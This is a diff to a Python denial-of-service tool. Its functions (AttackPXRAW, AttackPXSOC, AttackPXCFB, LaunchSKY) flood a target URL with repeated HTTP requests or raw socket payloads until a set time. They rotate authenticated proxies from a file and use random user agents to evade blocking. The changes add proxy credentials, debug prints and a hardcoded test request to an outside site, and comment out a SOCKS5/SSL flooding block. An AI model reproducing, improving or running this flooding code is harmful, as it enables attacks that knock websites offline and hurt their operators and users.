@@ -252,15 +252,22 @@ def LaunchPXRAW(url, th, t):
 
 def AttackPXRAW(url, until_datetime):
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
-        proxy = 'http://'+str(random.choice(list(proxies)))
-        proxy = {
-            'http': proxy,   
-            'https': proxy,
+        proxies = open("./proxy.txt", 'r').read().split('\n')
+
+        proxy = random.choice(proxies).strip().split(":")
+        proxy_url = f"http://{proxy[2]}:{proxy[3]}@{proxy[0]}:{proxy[1]}"
+        proxies = {
+        'http': proxy_url,
         }
+        headers = {
+            'User-Agent': random.choice(ua),
+
+        }
+        print(proxies)
         try:
-            requests.get(url, proxies=proxy)
-            requests.get(url, proxies=proxy)
-        except:
+            print(requests.get(url))
+        except Exception as e:
+            print(e)
             pass
 #endregion
 
@@ -284,24 +291,26 @@ def AttackPXSOC(target, until_datetime, req):
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
             proxy = random.choice(list(proxies)).split(":")
+            
             if target['scheme'] == 'https':
                 s = socks.socksocket()
                 s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
+                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]), True, proxy[2], proxy[3])
                 s.connect((str(target['host']), int(target['port'])))
                 s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
             else:
                 s = socks.socksocket()
                 s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
+                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]), True, proxy[2], proxy[3])
                 s.connect((str(target['host']), int(target['port'])))
             try:
                 for _ in range(100):
                     print(s.send(str.encode(req)))
-            except:
-                print('faild')
+            except Exception as e:
+                print(e)
                 s.close()
-        except:
+        except Exception as e:
+            print(e)
             print('faild')
 
             return
@@ -534,6 +543,8 @@ def AttackPXCFB(url, until_datetime, scraper):
                 proxy_url = f"http://{proxy[2]}:{proxy[3]}@{proxy[0]}:{proxy[1]}"
                 proxies = {
                 'http': proxy_url,
+                'https': proxy_url,
+
                 }
                 headers = {
                     'User-Agent': random.choice(ua),
@@ -656,53 +667,55 @@ def LaunchSKY(url, timer):
     req += "Connection: Keep-Alive\r\n\r\n"
     while time.time() < timelol:
         try:
+            socks.set_default_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]), True, proxy[2], proxy[3])
+            socket.socket = socks.socksocket
+            print(requests.get('https://thienduongtrochoi.chat/').status_code)
+            # # Create a SOCKS5 proxy socket
+            # s = socks.socksocket()
+            # print('66666666')
             
-            # Create a SOCKS5 proxy socket
-            s = socks.socksocket()
-            print('66666666')
-            
-            # Connect to the server
-            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]), True, proxy[2], proxy[3])
-            s.connect((str(urlparse(url).netloc), 443))
+            # # Connect to the server
+            # s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]), True, proxy[2], proxy[3])
+            # s.connect((str(urlparse(url).netloc), 443))
 
-            print('4444444')
+            # print('4444444')
             
-            # Create SSL context and wrap the socket
-            ctx = ssl.create_default_context()
+            # # Create SSL context and wrap the socket
+            # ctx = ssl.create_default_context()
 
-            ctx.check_hostname = False
-            ctx.verify_mode = ssl.CERT_NONE
-            ssl.debug = True
-            print('333333',urlparse(url).netloc)
+            # ctx.check_hostname = False
+            # ctx.verify_mode = ssl.CERT_NONE
+            # ssl.debug = True
+            # print('333333',urlparse(url).netloc)
             
-            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
-            print('222222222')
+            # s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
+            # print('222222222')
             
-            try:
-                for _ in range(6):  # Send 6 requests per connection
-                    s.sendall(str.encode(req))
-                    print('1111')
+            # try:
+            #     for _ in range(6):  # Send 6 requests per connection
+            #         s.sendall(str.encode(req))
+            #         print('1111')
                     
-                    time.sleep(1)
-                response = s.recv(4096)
+            #         time.sleep(1)
+            #     response = s.recv(4096)
 
-                # Print the raw response
-                raw_response = response.decode()
+            #     # Print the raw response
+            #     raw_response = response.decode()
          
 
-                # Ensure the response is large enough to disable friendly error pages
-                min_length = 512
-                if len(raw_response) < min_length:
-                    padding = ' ' * (min_length - len(raw_response))
-                    raw_response += padding
+            #     # Ensure the response is large enough to disable friendly error pages
+            #     min_length = 512
+            #     if len(raw_response) < min_length:
+            #         padding = ' ' * (min_length - len(raw_response))
+            #         raw_response += padding
                 
-                print("Padded response:")
-                print(raw_response)
-            except Exception as e:
-                print(f'Error sending requests: {e}')
-                s.close()  # Ensure the socket is closed after use
-            finally:
-                s.close()  # Ensure the socket is closed after use
+            #     print("Padded response:")
+            #     print(raw_response)
+            # except Exception as e:
+            #     print(f'Error sending requests: {e}')
+            #     s.close()  # Ensure the socket is closed after use
+            # finally:
+            #     s.close()  # Ensure the socket is closed after use
         except Exception as e:
             print(f'Error in connection setup: {e}')
             
